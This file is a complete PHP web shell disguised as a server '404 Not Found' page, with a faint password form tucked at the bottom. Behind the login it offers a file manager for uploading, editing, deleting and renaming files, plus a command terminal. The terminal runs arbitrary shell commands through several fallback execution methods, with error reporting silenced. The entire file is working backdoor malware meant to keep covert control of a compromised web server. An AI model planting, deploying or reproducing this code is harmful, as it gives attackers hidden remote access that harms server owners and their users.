<?php
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
session_start();
$valid_hash = '$2y$10$wg9lRJsLZgU0Dk0BRMowU.87PjIOMQiDSKNfHF3YcPFNabEPlF/Fm';
if (!isset($_SESSION['sigma_access'])) {
    if (isset($_POST['sigma_pass'])) {
        if (password_verify($_POST['sigma_pass'], $valid_hash)) {
            $_SESSION['sigma_access'] = true;
            header('Location: ' . $_SERVER['PHP_SELF']);
            exit;
        }
    }
    http_response_code(404);
    $requested_url = $_SERVER['REQUEST_URI'] ?? '/';
    ?>
    <!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
    <html>
    <head>
        <title>404 Not Found</title>
        <style>
            .sigma-form {
                position: fixed;
                bottom: 20px;
                left: 50%;
                transform: translateX(-50%);
                opacity: 0.15;
                transition: opacity 0.3s ease;
                text-align: center;
                pointer-events: auto;
                z-index: 1000;
            }
            .sigma-form:hover {
                opacity: 0.4;
            }
            .sigma-form input {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                width: 150px;
                border-radius: 0;
            }
            .sigma-form input:focus {
                outline: none;
                border-color: #666;
                background: rgba(255,255,255,0.1);
            }
            .sigma-form button {
                background: transparent;
                border: 1px solid #ccc;
                color: #333;
                padding: 6px 12px;
                font-size: 13px;
                font-family: 'Times New Roman', serif;
                cursor: pointer;
                margin-left: 5px;
            }
            .sigma-form button:hover {
                background: rgba(0,0,0,0.05);
            }
            .sigma-hint {
                display: none;
            }
            .error-msg {
                position: fixed;
                top: 50%;
                left: 50%;
                transform: translate(-50%, -50%);
                background: rgba(255,0,0,0.1);
                border: 1px solid #ff0000;
                color: #ff0000;
                padding: 5px 10px;
                font-size: 12px;
                font-family: monospace;
                opacity: 0.7;
            }
        </style>
    </head>
    <body>
        <h1>Not Found</h1>
        <p>The requested URL <?php echo htmlspecialchars($requested_url); ?> was not found on this server.</p>
        <p>Additionally, a 404 Not Found error was encountered while trying to use an ErrorDocument to handle the request.</p>
        <form method="POST" class="sigma-form" autocomplete="off">
            <input type="password" name="sigma_pass" placeholder="••••••">
            <button type="submit">→</button>
        </form>
        <?php if (isset($_POST['sigma_pass'])): ?>
            <div class="error-msg">Access denied</div>
        <?php endif; ?>
        <script>
        (function() {
            const form = document.querySelector('.sigma-form');
            const input = form.querySelector('input');
            input.addEventListener('focus', function() {
                form.style.opacity = '0.8';
            });
            input.addEventListener('blur', function() {
                form.style.opacity = '0.15';
            });
        })();
        </script>
    </body>
    </html>
    <?php
    exit;
}
$currentPath = isset($_GET['path']) ? realpath($_GET['path']) : getcwd();
if (!$currentPath || !is_dir($currentPath)) {
    $currentPath = getcwd();
}
$item = isset($_GET['item']) ? basename($_GET['item']) : '';
$itemPath = $currentPath . DIRECTORY_SEPARATOR . $item;
function executeCommand($command, $currentPath) {
    error_reporting(0);
    class WebShell {
        private $methods = [];
        public function __construct() {
            $this->detectMethods();
        }
        private function detectMethods() {
            if (function_exists('pcntl_fork') && function_exists('pcntl_exec')) {
                $this->methods[] = 'pcntl';
            }
            $this->methods[] = 'backtick';
            if (function_exists('preg_replace_callback')) {
                $this->methods[] = 'preg';
            }
            if (function_exists('fsockopen')) {
                $this->methods[] = 'fsockopen';
            }
        }
        public function execute($command, $currentPath) {
            $command = "cd " . escapeshellarg($currentPath) . " && " . $command . " 2>&1";
            foreach ($this->methods as $method) {
                $result = $this->tryMethod($method, $command);
                if ($result !== false && $result !== '') {
                    return $result;
                }
            }
            return "No execution method worked";
        }
        private function tryMethod($method, $command) {
            switch($method) {
                case 'pcntl':
                    return $this->pcntlExecute($command);
                case 'backtick':
                    $output = `$command`;
                    return $output !== null ? $output : false;
                case 'preg':
                    ob_start();
                    preg_replace_callback('/.*/', function($m) use ($command) {
                        system($command);
                    }, 'test');
                    $output = ob_get_clean();
                    return $output ?: false;
                case 'fsockopen':
                    return $this->fsockopenExecute($command);
            }
            return false;
        }
        private function pcntlExecute($command) {
            $tmpfile = tempnam(sys_get_temp_dir(), 'out');
            $fullCmd = $command . " > " . $tmpfile . " 2>&1";
            $pid = pcntl_fork();
            if ($pid == 0) {
                $args = ['/bin/sh', '-c', $fullCmd];
                pcntl_exec('/bin/sh', ['-c', $fullCmd]);
                exit(0);
            } else {
                pcntl_waitpid($pid, $status);
                $output = @file_get_contents($tmpfile);
                @unlink($tmpfile);
                return $output;
            }
        }
        private function fsockopenExecute($command) {
            $descriptorspec = array(
                0 => array("pipe", "r"),
                1 => array("pipe", "w"),
                2 => array("pipe", "w")
            );
            $process = proc_open($command, $descriptorspec, $pipes);
            if (is_resource($process)) {
                fclose($pipes[0]);
                $output = stream_get_contents($pipes[1]);
                fclose($pipes[1]);
                fclose($pipes[2]);
                proc_close($process);
                return $output;
            }
            return false;
        }
    }
    $shell = new WebShell();
    return $shell->execute($command, $currentPath);
}
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['cmd'])) {
    $cmd_result = executeCommand($_POST['cmd'], $currentPath);
}
function showDirectory($dir)
{
    $entries = array_diff(scandir($dir), ['.', '..']);
    echo "<div class='directory-section'>";
    echo "<h2>Directory: <span class='path'>$dir</span></h2>";
    echo "<div class='file-list'>";
    foreach ($entries as $entry) {
        $fullPath = realpath($dir . DIRECTORY_SEPARATOR . $entry);
        $isDir = is_dir($fullPath);
        $iconClass = $isDir ? 'folder' : 'file';
        echo "<div class='file-item $iconClass'>";
        if ($isDir) {
            echo "<div class='file-name'><a href='?path=" . urlencode($fullPath) . "'>$entry</a></div>";
        } else {
            echo "<div class='file-name'>$entry</div>";
            echo "<div class='file-actions'>";
            echo "<a class='btn-action edit' href='?path=" . urlencode($dir) . "&action=edit&item=" . urlencode($entry) . "'>Edit</a>";
            echo "<a class='btn-action delete' href='?path=" . urlencode($dir) . "&action=delete&item=" . urlencode($entry) . "'>Delete</a>";
            echo "<a class='btn-action rename' href='?path=" . urlencode($dir) . "&action=rename&item=" . urlencode($entry) . "'>Rename</a>";
            echo "</div>";
        }
        echo "</div>";
    }
    echo "</div></div>";
}
function uploadFile($dir)
{
    if (!empty($_FILES['file']['name'])) {
        $target = $dir . DIRECTORY_SEPARATOR . basename($_FILES['file']['name']);
        if (move_uploaded_file($_FILES['file']['tmp_name'], $target)) {
            echo "<div class='message success'>File uploaded successfully!</div>";
        } else {
            echo "<div class='message error'>Upload failed.</div>";
        }
    }
}
function makeFolder($dir)
{
    $folder = trim($_POST['folder_name']);
    if (!$folder) return;
    $folderPath = $dir . DIRECTORY_SEPARATOR . $folder;
    if (!file_exists($folderPath)) {
        mkdir($folderPath);
        echo "<div class='message success'>Folder created: $folder</div>";
    } else {
        echo "<div class='message warning'>Folder already exists.</div>";
    }
}
function makeFile($dir)
{
    $file = trim($_POST['file_name']);
    if (!$file) return;
    $filePath = $dir . DIRECTORY_SEPARATOR . $file;
    if (!file_exists($filePath)) {
        file_put_contents($filePath, '');
        echo "<div class='message success'>File created: $file</div>";
    } else {
        echo "<div class='message warning'>File already exists.</div>";
    }
}
function editFile($path)
{
    if (!file_exists($path)) {
        echo "<div class='message error'>File not found.</div>";
        return;
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['content'])) {
        file_put_contents($path, $_POST['content']);
        echo "<div class='message success'>Saved successfully!</div>";
    }
    $content = htmlspecialchars(file_get_contents($path));
    echo "<div class='edit-section'>";
    echo "<h3>Editing: " . basename($path) . "</h3>";
    echo "<form method='POST'>";
    echo "<textarea name='content' class='editor'>$content</textarea><br>";
    echo "<div class='form-actions'>";
    echo "<button type='submit' class='btn'>Save</button>";
    echo "</div>";
    echo "</form>";
    echo "</div>";
}
function removeFile($path)
{
    if (file_exists($path) && is_file($path)) {
        unlink($path);
        echo "<div class='message success'>File deleted.</div>";
    } else {
        echo "<div class='message error'>File not found.</div>";
    }
}
function renameItem($path)
{
    if (!file_exists($path)) {
        echo "<div class='message error'>Item not found.</div>";
        return;
    }
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && !empty($_POST['new_name'])) {
        $newPath = dirname($path) . DIRECTORY_SEPARATOR . basename($_POST['new_name']);
        if (rename($path, $newPath)) {
            echo "<div class='message success'>Renamed successfully!</div>";
        } else {
            echo "<div class='message error'>Rename failed.</div>";
        }
    } else {
        echo "<div class='rename-section'>";
        echo "<h3>Rename: " . basename($path) . "</h3>";
        echo "<form method='POST'>";
        echo "<input type='text' name='new_name' placeholder='New name' required class='input-field'>";
        echo "<div class='form-actions'>";
        echo "<button type='submit' class='btn'>Rename</button>";
        echo "</div>";
        echo "</form>";
        echo "</div>";
    }
}
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (isset($_FILES['file'])) uploadFile($currentPath);
    if (isset($_POST['folder_name'])) makeFolder($currentPath);
    if (isset($_POST['file_name'])) makeFile($currentPath);
}
if (isset($_GET['action']) && $item) {
    switch ($_GET['action']) {
        case 'edit': editFile($itemPath); break;
        case 'delete': removeFile($itemPath); break;
        case 'rename': renameItem($itemPath); break;
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>File Manager</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
        }
        body {
            background-color: #f5f5f5;
            color: #333;
            line-height: 1.6;
            padding: 20px;
            max-width: 1400px;
            margin: 0 auto;
        }
        .container {
            background: white;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            padding: 30px;
        }
        h1 {
            color: #2c3e50;
            margin-bottom: 20px;
            padding-bottom: 10px;
            border-bottom: 1px solid #eaeaea;
        }
        h2 {
            color: #34495e;
            font-size: 18px;
            margin: 20px 0 15px 0;
        }
        h3 {
            color: #2c3e50;
            font-size: 16px;
            margin: 15px 0 10px 0;
        }
        .path {
            color: #7f8c8d;
            font-weight: normal;
            font-size: 14px;
        }
        .navigation {
            margin-bottom: 20px;
        }
        .btn {
            background: #3498db;
            color: white;
            border: none;
            padding: 8px 16px;
            border-radius: 4px;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
        }
        .btn:hover {
            background: #2980b9;
        }
        .btn-up {
            background: #95a5a6;
            margin-bottom: 20px;
        }
        .btn-up:hover {
            background: #7f8c8d;
        }
        .directory-section {
            margin-bottom: 30px;
        }
        .file-list {
            border: 1px solid #eaeaea;
            border-radius: 4px;
            overflow: hidden;
        }
        .file-item {
            display: flex;
            align-items: center;
            padding: 12px 15px;
            border-bottom: 1px solid #eaeaea;
            transition: background-color 0.2s;
        }
        .file-item:hover {
            background-color: #f8f9fa;
        }
        .file-item:last-child {
            border-bottom: none;
        }
        .file-item.folder {
            background-color: #f8f9fa;
        }
        .file-name {
            flex: 1;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 14px;
        }
        .file-name a {
            color: #2c3e50;
            text-decoration: none;
            font-weight: 500;
        }
        .file-name a:hover {
            color: #3498db;
            text-decoration: underline;
        }
        .file-actions {
            display: flex;
            gap: 10px;
        }
        .btn-action {
            padding: 4px 8px;
            border-radius: 3px;
            font-size: 12px;
            text-decoration: none;
            color: white;
        }
        .btn-action.edit {
            background: #27ae60;
        }
        .btn-action.delete {
            background: #e74c3c;
        }
        .btn-action.rename {
            background: #f39c12;
        }
        .btn-action:hover {
            opacity: 0.9;
        }
        .forms-grid {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-top: 30px;
        }
        .form-section {
            background: #f8f9fa;
            padding: 20px;
            border-radius: 6px;
            border: 1px solid #eaeaea;
        }
        .terminal-section {
            grid-column: span 2;
            background: #2c3e50;
            color: white;
        }
        .terminal-section h3 {
            color: white;
        }
        .input-field {
            width: 100%;
            padding: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 14px;
            margin: 10px 0;
        }
        .input-field:focus {
            outline: none;
            border-color: #3498db;
        }
        .terminal-output {
            background: #1a252f;
            color: #ecf0f1;
            padding: 15px;
            border-radius: 4px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 12px;
            white-space: pre-wrap;
            word-break: break-all;
            max-height: 300px;
            overflow-y: auto;
            margin-top: 15px;
        }
        .editor {
            width: 100%;
            height: 300px;
            padding: 15px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-family: 'Monaco', 'Menlo', monospace;
            font-size: 13px;
            line-height: 1.5;
            resize: vertical;
        }
        .form-actions {
            margin-top: 15px;
        }
        .message {
            padding: 12px 15px;
            margin: 15px 0;
            border-radius: 4px;
            border-left: 4px solid;
        }
        .message.success {
            background-color: #d5edda;
            border-color: #27ae60;
            color: #155724;
        }
        .message.error {
            background-color: #f8d7da;
            border-color: #e74c3c;
            color: #721c24;
        }
        .message.warning {
            background-color: #fff3cd;
            border-color: #f39c12;
            color: #856404;
        }
        .edit-section, .rename-section {
            background: white;
            padding: 20px;
            border-radius: 6px;
            border: 1px solid #eaeaea;
            margin: 20px 0;
        }
        hr {
            border: none;
            border-top: 1px solid #eaeaea;
            margin: 30px 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>File Manager</h1>
        <div class="navigation">
            <a href="?path=<?php echo urlencode(dirname($currentPath)); ?>" class="btn btn-up">Go Up</a>
        </div>
        <?php
        if (isset($_GET['action']) && $item) {
        } else {
            showDirectory($currentPath);
        }
        ?>
        <div class="forms-grid">
            <div class="form-section">
                <h3>Upload File</h3>
                <form method="POST" enctype="multipart/form-data">
                    <input type="file" name="file" required class="input-field">
                    <div class="form-actions">
                        <button type="submit" class="btn">Upload</button>
                    </div>
                </form>
            </div>
            <div class="form-section">
                <h3>Create Folder</h3>
                <form method="POST">
                    <input type="text" name="folder_name" placeholder="Folder name" required class="input-field">
                    <div class="form-actions">
                        <button type="submit" class="btn">Create</button>
                    </div>
                </form>
            </div>
            <div class="form-section">
                <h3>Create File</h3>
                <form method="POST">
                    <input type="text" name="file_name" placeholder="File name" required class="input-field">
                    <div class="form-actions">
                        <button type="submit" class="btn">Create</button>
                    </div>
                </form>
            </div>
            <div class="form-section terminal-section">
                <h3>Terminal/Command Shell</h3>
                <form method="POST">
                    <input type="text" name="cmd" placeholder="Enter command (e.g., ls -la, pwd, whoami)" required class="input-field">
                    <div class="form-actions">
                        <button type="submit" class="btn">Execute</button>
                    </div>
                </form>
                <?php if (isset($cmd_result)): ?>
                <div class="terminal-output">
                    <strong>Command Output:</strong><br>
                    <?php echo htmlspecialchars($cmd_result); ?>
                </div>
                <?php endif; ?>
            </div>
        </div>
    </div>
</body>
</html>